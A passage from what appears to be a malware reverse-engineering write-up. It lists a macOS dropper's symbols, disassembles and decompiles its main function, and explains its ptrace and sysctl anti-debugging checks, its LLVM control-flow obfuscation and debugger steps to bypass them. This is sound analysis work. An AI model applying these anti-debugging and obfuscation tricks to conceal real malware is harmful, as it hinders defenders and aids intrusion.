</span></span><span class=line><span class=cl>000000010000543f t +<span class=o>[</span>GIFileOps setSuid:<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000063ae t +<span class=o>[</span>GIFileOps unloadAgent:<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000064d1 t +<span class=o>[</span>GIFileOps unloadKext<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100029ca9 t +<span class=o>[</span>GIFileOps<span class=o>(</span>Zip<span class=o>)</span> unzip:to:<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010000765c t +<span class=o>[</span>GIPath agentName<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010000767b t +<span class=o>[</span>GIPath agentSource<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007726</span> t +<span class=o>[</span>GIPath agentTarget<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007298</span> t +<span class=o>[</span>GIPath compressedPayload<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007522</span> t +<span class=o>[</span>GIPath coreName<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007541</span> t +<span class=o>[</span>GIPath coreSource<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000075ec t +<span class=o>[</span>GIPath coreTarget<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000065bd t +<span class=o>[</span>GIPath executables<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007378</span> t +<span class=o>[</span>GIPath expandedMainBundle<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007308</span> t +<span class=o>[</span>GIPath expandedPayload<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100006cb2 t +<span class=o>[</span>GIPath installationMap<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000070d2 t +<span class=o>[</span>GIPath installer<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000073e8 t +<span class=o>[</span>GIPath kextName<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007407</span> t +<span class=o>[</span>GIPath kextSource<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000074b2 t +<span class=o>[</span>GIPath kextTarget<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007940</span> t +<span class=o>[</span>GIPath masterKeyDirSource<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000078d0 t +<span class=o>[</span>GIPath masterKeyDirTarget<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007142</span> t +<span class=o>[</span>GIPath payload<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007796</span> t +<span class=o>[</span>GIPath supervisorName<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000077b5 t +<span class=o>[</span>GIPath supervisorSource<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007860</span> t +<span class=o>[</span>GIPath supervisorTarget<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100006f2a t +<span class=o>[</span>GIPath systemTemp<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100007062</span> t +<span class=o>[</span>GIPath trampoline<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000071ed t +<span class=o>[</span>GIPath updatePackage<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100027f49 t -<span class=o>[</span>ZipArchive CloseZipFile2<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010002762f t -<span class=o>[</span>ZipArchive CreateZipFile2:Password:<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000274c3 t -<span class=o>[</span>ZipArchive CreateZipFile2:<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100029b52 t -<span class=o>[</span>ZipArchive Date1980<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010002996e t -<span class=o>[</span>ZipArchive OutputErrorMessage:<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100029a29 t -<span class=o>[</span>ZipArchive OverWrite:<span class=o>]</span>
</span></span><span class=line><span class=cl>00000001000297ea t -<span class=o>[</span>ZipArchive UnzipCloseFile<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010002818a t -<span class=o>[</span>ZipArchive UnzipFileTo:overWrite:<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010002816d t -<span class=o>[</span>ZipArchive UnzipOpenFile:Password:<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010002800f t -<span class=o>[</span>ZipArchive UnzipOpenFile:<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010002764c t -<span class=o>[</span>ZipArchive addFileToZip:newname:<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100027484</span> t -<span class=o>[</span>ZipArchive dealloc<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100029c46 t -<span class=o>[</span>ZipArchive delegate<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100027300</span> t -<span class=o>[</span>ZipArchive init<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100029c8c t -<span class=o>[</span>ZipArchive setDelegate:<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010000275c t -<span class=o>[</span>appAppDelegate applicationDidFinishLaunching:<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100004884</span> t -<span class=o>[</span>appAppDelegate askUserPermission:<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100003283</span> t -<span class=o>[</span>appAppDelegate executeTrampoline<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100002b29 t -<span class=o>[</span>appAppDelegate expandPayload<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100003581</span> t -<span class=o>[</span>appAppDelegate installPayload<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100003e87 t -<span class=o>[</span>appAppDelegate isAfterPatch<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>0000000100003658</span> t -<span class=o>[</span>appAppDelegate launchNewStyle<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010000384a t -<span class=o>[</span>appAppDelegate launchOldStyle<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100002a41 t -<span class=o>[</span>appAppDelegate removeOldResource<span class=o>]</span>
</span></span><span class=line><span class=cl>0000000100003c37 t -<span class=o>[</span>appAppDelegate removeTraces<span class=o>]</span>
</span></span><span class=line><span class=cl>000000010002a781 t ___ARCLite__load
</span></span><span class=line><span class=cl>000000010002aa1b t ___arclite_NSArray_objectAtIndexedSubscript
</span></span><span class=line><span class=cl>000000010002aa95 t ___arclite_NSDictionary_objectForKeyedSubscript
</span></span><span class=line><span class=cl>000000010002aa30 t ___arclite_NSMutableArray_setObject_atIndexedSubscript
</span></span><span class=line><span class=cl>000000010002aaaa t ___arclite_NSMutableDictionary__setObject_forKeyedSubscript
</span></span><span class=line><span class=cl>000000010002aad1 t ___arclite_NSMutableOrderedSet_setObject_atIndexedSubscript
</span></span><span class=line><span class=cl>000000010002aabc t ___arclite_NSOrderedSet_objectAtIndexedSubscript
</span></span><span class=line><span class=cl>000000010002b0bc t ___arclite_objc_autorelease
</span></span><span class=line><span class=cl>000000010002aae3 t ___arclite_objc_autoreleasePoolPop
</span></span><span class=line><span class=cl>000000010002ad6c t ___arclite_objc_autoreleasePoolPush
</span></span><span class=line><span class=cl>000000010002b0f6 t ___arclite_objc_autoreleaseReturnValue
</span></span><span class=line><span class=cl>000000010002b0a7 t ___arclite_objc_release
</span></span><span class=line><span class=cl>000000010002b088 t ___arclite_objc_retain
</span></span><span class=line><span class=cl>000000010002b0d1 t ___arclite_objc_retainAutorelease
</span></span><span class=line><span class=cl>000000010002b10b t ___arclite_objc_retainAutoreleaseReturnValue
</span></span><span class=line><span class=cl>000000010002b130 t ___arclite_objc_retainAutoreleasedReturnValue
</span></span><span class=line><span class=cl>000000010002b09d t ___arclite_objc_retainBlock
</span></span><span class=line><span class=cl>000000010002b145 t ___arclite_objc_storeStrong
</span></span><span class=line><span class=cl>000000010002af14 t ___arclite_object_copy
</span></span><span class=line><span class=cl>000000010002ad85 t ___arclite_object_setInstanceVariable
</span></span><span class=line><span class=cl>000000010002ade7 t ___arclite_object_setIvar
</span></span><span class=line><span class=cl><span class=m>0000000100000000</span> T __mh_execute_header
</span></span><span class=line><span class=cl>000000010001e6d2 t _add_data_in_datablock
</span></span><span class=line><span class=cl>000000010002a9eb t _add_image_hook_ARC
</span></span><span class=line><span class=cl>000000010002aa03 t _add_image_hook_GC
</span></span><span class=line><span class=cl>00000001000270a3 t _allocate_new_datablock
</span></span><span class=line><span class=cl>00000001000016e0 t _deny_ptrace
</span></span><span class=line><span class=cl>00000001000081d1 t _fclose_file_func
</span></span><span class=line><span class=cl>00000001000081de t _ferror_file_func
</span></span><span class=line><span class=cl><span class=m>0000000100008226</span> t _fill_fopen_filefunc
</span></span><span class=line><span class=cl>00000001000079b0 t _fopen_file_func
</span></span><span class=line><span class=cl>0000000100007e74 t _fread_file_func
</span></span><span class=line><span class=cl>0000000100007f02 t _fseek_file_func
</span></span><span class=line><span class=cl>0000000100007ef5 t _ftell_file_func
</span></span><span class=line><span class=cl>0000000100007eda t _fwrite_file_func
</span></span><span class=line><span class=cl>0000000100026f19 t _init_keys
</span></span><span class=line><span class=cl>000000010000174f t _main
</span></span><span class=line><span class=cl>000000010002a766 T _objc_retainedObject
</span></span><span class=line><span class=cl>000000010002a76f T _objc_unretainedObject
</span></span><span class=line><span class=cl>000000010002a778 T _objc_unretainedPointer
</span></span><span class=line><span class=cl>000000010002aaf5 t _patch_lazy_pointers
</span></span><span class=line><span class=cl>000000010000fab0 t _strcmpcasenosensitive_internal
</span></span><span class=line><span class=cl>00000001000123b5 t _unzClose
</span></span><span class=line><span class=cl><span class=m>0000000100012549</span> t _unzCloseCurrentFile
</span></span><span class=line><span class=cl>0000000100012b6f t _unzGetCurrentFileInfo
</span></span><span class=line><span class=cl>000000010001525e t _unzGetFilePos
</span></span><span class=line><span class=cl>000000010001a5df t _unzGetGlobalComment
</span></span><span class=line><span class=cl>0000000100012adc t _unzGetGlobalInfo
</span></span><span class=line><span class=cl>000000010001a111 t _unzGetLocalExtrafield
</span></span><span class=line><span class=cl>000000010001aab5 t _unzGetOffset
</span></span><span class=line><span class=cl>00000001000154f3 t _unzGoToFilePos
</span></span><span class=line><span class=cl><span class=m>0000000100012296</span> t _unzGoToFirstFile
</span></span><span class=line><span class=cl>00000001000147be t _unzGoToNextFile
</span></span><span class=line><span class=cl>0000000100014b6b t _unzLocateFile
</span></span><span class=line><span class=cl>00000001000123a9 t _unzOpen
</span></span><span class=line><span class=cl><span class=m>0000000100010128</span> t _unzOpen2
</span></span><span class=line><span class=cl>00000001000189cc t _unzOpenCurrentFile
</span></span><span class=line><span class=cl>0000000100018a36 t _unzOpenCurrentFile2
</span></span><span class=line><span class=cl><span class=m>0000000100015692</span> t _unzOpenCurrentFile3
</span></span><span class=line><span class=cl>0000000100018a20 t _unzOpenCurrentFilePassword
</span></span><span class=line><span class=cl>0000000100018a43 t _unzReadCurrentFile
</span></span><span class=line><span class=cl><span class=m>0000000100008280</span> t _unzRepair
</span></span><span class=line><span class=cl>000000010001ad39 t _unzSetOffset
</span></span><span class=line><span class=cl>000000010000f921 t _unzStringFileNameCompare
</span></span><span class=line><span class=cl>0000000100019efa t _unzeof
</span></span><span class=line><span class=cl>000000010001789d t _unzlocal_CheckCurrentFileCoherencyHeader
</span></span><span class=line><span class=cl>0000000100012ba9 t _unzlocal_GetCurrentFileInfoInternal
</span></span><span class=line><span class=cl>000000010001ae36 t _unzlocal_getByte
</span></span><span class=line><span class=cl>0000000100011d6c t _unzlocal_getLong
</span></span><span class=line><span class=cl>0000000100011f96 t _unzlocal_getShort
</span></span><span class=line><span class=cl>0000000100019d43 t _unztell
</span></span><span class=line><span class=cl>0000000100025a9b t _zipClose
</span></span><span class=line><span class=cl><span class=m>0000000100023296</span> t _zipCloseFileInZip
</span></span><span class=line><span class=cl>0000000100024e85 t _zipCloseFileInZipRaw
</span></span><span class=line><span class=cl>0000000100024bda t _zipFlushWriteBuffer
</span></span><span class=line><span class=cl>000000010001ef74 t _zipOpen
</span></span><span class=line><span class=cl>000000010001b00b t _zipOpen2
</span></span><span class=line><span class=cl>0000000100023f7c t _zipOpenNewFileInZip
</span></span><span class=line><span class=cl>0000000100023f11 t _zipOpenNewFileInZip2
</span></span><span class=line><span class=cl>000000010001efd2 t _zipOpenNewFileInZip3
</span></span><span class=line><span class=cl>000000010002404a t _zipWriteInFileInZip
</span></span><span class=line><span class=cl>00000001000232a4 t _ziplocal_TmzDateToDosDate
</span></span><span class=line><span class=cl><span class=m>0000000100027110</span> t _ziplocal_getByte
</span></span><span class=line><span class=cl>000000010001e082 t _ziplocal_getLong
</span></span><span class=line><span class=cl>000000010001e4ae t _ziplocal_getShort
</span></span><span class=line><span class=cl><span class=m>0000000100023997</span> t _ziplocal_putValue
</span></span><span class=line><span class=cl>000000010002351c t _ziplocal_putValue_inmemory
</span></span><span class=line><span class=cl>00000001000016a4 T start
</span></span></code></pre></div></div></div><br><p>Something that should always be verified is the existence of any constructors/destructors and Objective-C load methods. These are executed before <code>main</code> and we need to take a look at their contents. They can be used for all kinds of tricks before code starts executing at <code>main</code>.</p><p>In this case there aren&rsquo;t any so we can focus instead on <code>main</code>. The <code>start</code> symbol is called first but the only thing important happening there is the call to <code>main</code>, so we don&rsquo;t need to worry about it.</p><p>A small peek of <code>main</code> follows:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:10000174F    push    rbp
</span></span><span class=line><span class=cl>__text:100001750    mov     rbp, rsp
</span></span><span class=line><span class=cl>__text:100001753    push    r15
</span></span><span class=line><span class=cl>__text:100001755    push    r14
</span></span><span class=line><span class=cl>__text:100001757    push    r13
</span></span><span class=line><span class=cl>__text:100001759    push    r12
</span></span><span class=line><span class=cl>__text:10000175B    push    rbx
</span></span><span class=line><span class=cl>__text:10000175C    sub     rsp, 398h
</span></span><span class=line><span class=cl>__text:100001763    mov     r14, rsi
</span></span><span class=line><span class=cl>__text:100001766    mov     r15d, edi
</span></span><span class=line><span class=cl>__text:100001769    mov     rax, cs:___stack_chk_guard_ptr
</span></span><span class=line><span class=cl>__text:100001770    mov     rax, [rax]
</span></span><span class=line><span class=cl>__text:100001773    mov     [rbp+var_30], rax
</span></span><span class=line><span class=cl>__text:100001777    call    _objc_autoreleasePoolPush
</span></span><span class=line><span class=cl>__text:10000177C    mov     [rbp+context], rax
</span></span><span class=line><span class=cl>__text:100001783    call    _deny_ptrace ; &lt;------------ HERE
</span></span><span class=line><span class=cl>__text:100001788    mov     [rbp+var_40], 288h
</span></span><span class=line><span class=cl>__text:100001790    lea     rbx, [rbp+var_2C8]
</span></span><span class=line><span class=cl>__text:100001797    mov     esi, 288h
</span></span><span class=line><span class=cl>__text:10000179C    mov     rdi, rbx
</span></span><span class=line><span class=cl>__text:10000179F    call    ___bzero
</span></span><span class=line><span class=cl>__text:1000017A4    mov     dword ptr [rbp+__size], 1
</span></span><span class=line><span class=cl>__text:1000017AE    mov     dword ptr [rbp+__size+4], 0Eh
</span></span><span class=line><span class=cl>__text:1000017B8    mov     [rbp+var_2D8], 1
</span></span><span class=line><span class=cl>__text:1000017C2    call    _getpid
</span></span><span class=line><span class=cl>__text:1000017C7    mov     [rbp+var_2D4], eax
</span></span><span class=line><span class=cl>__text:1000017CD    lea     rdi, [rbp+__size] ; int *
</span></span><span class=line><span class=cl>__text:1000017D4    lea     rcx, [rbp+var_40] ; size_t *
</span></span><span class=line><span class=cl>__text:1000017D8    mov     esi, 4          ; u_int
</span></span><span class=line><span class=cl>__text:1000017DD    xor     r8d, r8d        ; void *
</span></span><span class=line><span class=cl>__text:1000017E0    xor     r9d, r9d        ; size_t
</span></span><span class=line><span class=cl>__text:1000017E3    mov     rdx, rbx        ; void *
</span></span><span class=line><span class=cl>__text:1000017E6    call    _sysctl ; &lt;----------------- HERE
</span></span><span class=line><span class=cl>__text:1000017EB    mov     [rbp+var_34], eax
</span></span><span class=line><span class=cl>__text:1000017EE    mov     r8d, [rbp+var_2A8]
</span></span><span class=line><span class=cl>__text:1000017F5    shr     r8d, 0Bh ; &lt;----------------
</span></span><span class=line><span class=cl>__text:1000017F9    and     r8d, 1
</span></span></code></pre></div></div></div><br><p>One of the calls is explicit on its intentions, to execute the ptrace anti-debugging trick.</p><blockquote><p>PT_DENY_ATTACH</p><p>This request is the other operation used by the traced process; it allows a process that is not currently being traced to deny future traces by its parent. All other arguments are ignored. If the process is currently being traced, it will exit with the exit status of ENOTSUP; otherwise, it sets a flag that denies future traces. An attempt by the parent to trace a process which has set this flag will result in a segmentation violation in the parent.</p></blockquote><p>The call to <code>sysctl</code> is also another anti-debugging trick based on Apple&rsquo;s <a href=https://developer.apple.com/library/archive/qa/qa1361/_index.html>AmIBeingDebugged</a> example. Pretty normal, boring stuff, easy to bypass!</p><p>To bypass <code>_deny_ptrace</code> we can set a breakpoint at address <code>0x100001783</code> and skip the call by setting the instruction pointer to the next address <code>0x100001788</code>. The command <code>skip</code> exists in <a href=https://github.com/gdbinit/lldbinit>lldbinit</a> for this purpose. A kernel extension like <a href=https://github.com/gdbinit/onyx-the-black-cat>Onyx The Black Cat</a> can take care of this transparently or we can just breakpoint into <code>ptrace</code> symbol and return the right value to fool the call. Skipping the call is just easier in this case.</p><p>To bypass the sysctl anti-debugging we just need to modify the return data. The debugger is detected under the following condition:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define P_TRACED    0x00000800  </span><span class=cm>/* Debugged process being traced */</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=n>info</span><span class=p>.</span><span class=n>kp_proc</span><span class=p>.</span><span class=n>p_flag</span> <span class=o>&amp;</span> <span class=n>P_TRACED</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ALERT: Debugger is found !!!!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>If we breakpoint at address <code>0x1000017F5</code> we can simply remove 0x800 from whatever value was moved to <code>r8</code> at previous instruction. This is what the code is doing, verifying if bit 11 is set. Once again, there are different ways to attack this from the kernel or from <code>sysctl</code> symbol. The breakpoint will work fine since we can script all this in <code>lldb</code>.</p><p>After the sysctl call we observe some weird code:</p><div class="terminal space shadow"><div class=top><div class=btns><span class="circle red"></span>
<span class="circle yellow"></span>
<span class="circle green"></span></div><div class=title>IDA</div></div><div class=terminalbody><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>__text:1000017E6    call    _sysctl
</span></span><span class=line><span class=cl>__text:1000017EB    mov     [rbp+var_34], eax
</span></span><span class=line><span class=cl>__text:1000017EE    mov     r8d, [rbp+var_2A8] ; info.kp_proc.p_flag (int)
</span></span><span class=line><span class=cl>__text:1000017F5    shr     r8d, 0Bh
</span></span><span class=line><span class=cl>__text:1000017F9    and     r8d, 1
</span></span><span class=line><span class=cl>__text:1000017FD    mov     edi, 470C6D79h
</span></span><span class=line><span class=cl>__text:100001802    mov     edx, 6A7B7BCBh
</span></span><span class=line><span class=cl>__text:100001807    jmp     short loc_100001810
</span></span><span class=line><span class=cl>__text:100001809 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>__text:100001809
</span></span><span class=line><span class=cl>__text:100001809 loc_100001809:                ; CODE XREF: _main+EEâj
</span></span><span class=line><span class=cl>__text:100001809    mov     esi, eax
</span></span><span class=line><span class=cl>__text:10000180B    mov     edi, 0A25B8AE8h
</span></span><span class=line><span class=cl>__text:100001810
</span></span><span class=line><span class=cl>__text:100001810 loc_100001810:                ; CODE XREF: _main+B8âj
</span></span><span class=line><span class=cl>__text:100001810                               ; _main+106âj
</span></span><span class=line><span class=cl>__text:100001810    mov     ecx, esi
</span></span><span class=line><span class=cl>__text:100001812    jmp     short loc_100001820
</span></span><span class=line><span class=cl>__text:100001814 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>__text:100001814
</span></span><span class=line><span class=cl>__text:100001814 loc_100001814:                ; CODE XREF: _main+E6âj
</span></span><span class=line><span class=cl>__text:100001814    cmp     [rbp+var_34], 0
</span></span><span class=line><span class=cl>__text:100001818    mov     edi, 0D4A840A1h
</span></span><span class=line><span class=cl>__text:10000181D    cmovnz  edi, edx
</span></span><span class=line><span class=cl>__text:100001820
</span></span><span class=line><span class=cl>__text:100001820 loc_100001820:                ; CODE XREF: _main+C3âj
</span></span><span class=line><span class=cl>__text:100001820                               ; _main+DEâj ...
</span></span><span class=line><span class=cl>__text:100001820    mov     ebx, edi
</span></span><span class=line><span class=cl>__text:100001822    mov     edi, 7BDEBDB0h
</span></span><span class=line><span class=cl>__text:100001827    cmp     ebx, 6A7B7BCBh
</span></span><span class=line><span class=cl>__text:10000182D    jz      short loc_100001820
</span></span><span class=line><span class=cl>__text:10000182F    cmp     ebx, 470C6D79h
</span></span><span class=line><span class=cl>__text:100001835    jz      short loc_100001814
</span></span><span class=line><span class=cl>__text:100001837    cmp     ebx, 7BDEBDB0h
</span></span><span class=line><span class=cl>__text:10000183D    jz      short loc_100001809
</span></span><span class=line><span class=cl>__text:10000183F    mov     edi, 2F10CD8Bh
</span></span><span class=line><span class=cl>__text:100001844    cmp     ebx, 0A25B8AE8h
</span></span><span class=line><span class=cl>__text:10000184A    jz      short loc_100001820
</span></span><span class=line><span class=cl>__text:10000184C    cmp     ebx, 0D4A840A1h
</span></span><span class=line><span class=cl>__text:100001852    mov     esi, r8d
</span></span><span class=line><span class=cl>__text:100001855    jz      short loc_100001810
</span></span><span class=line><span class=cl>__text:100001857    cmp     ebx, 2F10CD8Bh
</span></span><span class=line><span class=cl>__text:10000185D    jnz     short loc_10000188A
</span></span><span class=line><span class=cl>__text:10000185F    mov     [rbp+argc], r15d
</span></span><span class=line><span class=cl>__text:100001866    mov     [rbp+argv], r14
</span></span><span class=line><span class=cl>__text:10000186D    mov     [rbp+var_2E8], ecx
</span></span><span class=line><span class=cl>__text:100001873    mov     eax, 0AA554355h
</span></span><span class=line><span class=cl>__text:100001878    mov     [rbp+var_300], 0
</span></span><span class=line><span class=cl>__text:100001882    mov     [rbp+var_2FC], ecx
</span></span><span class=line><span class=cl>__text:100001888    jmp     short loc_100001891
</span></span></code></pre></div></div></div><br><p>This code doesn&rsquo;t look normal and executing anything useful. It is the result of <a href=https://github.com/obfuscator-llvm/obfuscator>LLVM-obfuscator</a>. In this case the control flow appears to be obfuscated. After the <code>r8</code> test we can&rsquo;t clearly see the test condition that we expect - we can just follow a bunch of jumps based on some weird values. This appears to be LLVM-obfuscator&rsquo;s <a href=https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow>Bogus Control Flow</a> feature.</p><blockquote><p>This method modifies a function call graph by adding a basic block before the current basic block. This new basic block contains an opaque predicate and then makes a conditional jump to the original basic block.</p><p>The original basic block is also cloned and filled up with junk instructions chosen at random.</p></blockquote><p>QuarksLab has a very interesting post about this obfuscator: <a href=https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html>Deobfuscation: recovering an OLLVM-protected program</a>.</p><p>The function graph is too long to display here but it&rsquo;s even easier to visualise the obfuscator with the decompiler:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=n>context</span> <span class=o>=</span> <span class=nf>objc_autoreleasePoolPush</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>deny_ptrace</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v53</span> <span class=o>=</span> <span class=mi>648LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>__bzero</span><span class=p>(</span><span class=n>v51</span><span class=p>,</span> <span class=mi>648LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__size</span> <span class=o>=</span> <span class=mh>0xE00000001LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v49</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v50</span> <span class=o>=</span> <span class=nf>getpid</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=c1>// amIBeingDebugged
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>sysctl</span><span class=p>((</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>__size</span><span class=p>,</span> <span class=mi>4u</span><span class=p>,</span> <span class=n>v51</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v53</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v54</span> <span class=o>=</span> <span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=mh>0x470C6D79</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v8</span> <span class=o>=</span> <span class=mh>0x6A7B7BCBLL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>do</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nl>LABEL_3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>v9</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>v10</span> <span class=o>=</span> <span class=n>v7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v7</span> <span class=o>=</span> <span class=mh>0x7BDEBDB0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span> <span class=n>v10</span> <span class=o>==</span> <span class=mh>0x6A7B7BCB</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>v10</span> <span class=o>!=</span> <span class=mh>0x470C6D79</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v7</span> <span class=o>=</span> <span class=mh>0xD4A840A1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>v54</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>v7</span> <span class=o>=</span> <span class=mh>0x6A7B7BCB</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>v10</span> <span class=o>==</span> <span class=mh>0x7BDEBDB0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>v5</span> <span class=o>=</span> <span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v7</span> <span class=o>=</span> <span class=mh>0xA25B8AE8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>LABEL_3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=n>v7</span> <span class=o>=</span> <span class=mh>0x2F10CD8B</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=n>v10</span> <span class=o>==</span> <span class=mh>0xA25B8AE8</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// the P_TRACED check
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// info.kp_proc.p_flag
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>v5</span> <span class=o>=</span> <span class=p>(</span><span class=n>v52</span> <span class=o>&gt;&gt;</span> <span class=mi>11</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=n>v10</span> <span class=o>==</span> <span class=mh>0xD4A840A1</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>argca</span> <span class=o>=</span> <span class=n>argc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>argva</span> <span class=o>=</span> <span class=n>argv</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v46</span> <span class=o>=</span> <span class=n>v9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=mh>0xAA554355</span><span class=p>;</span>
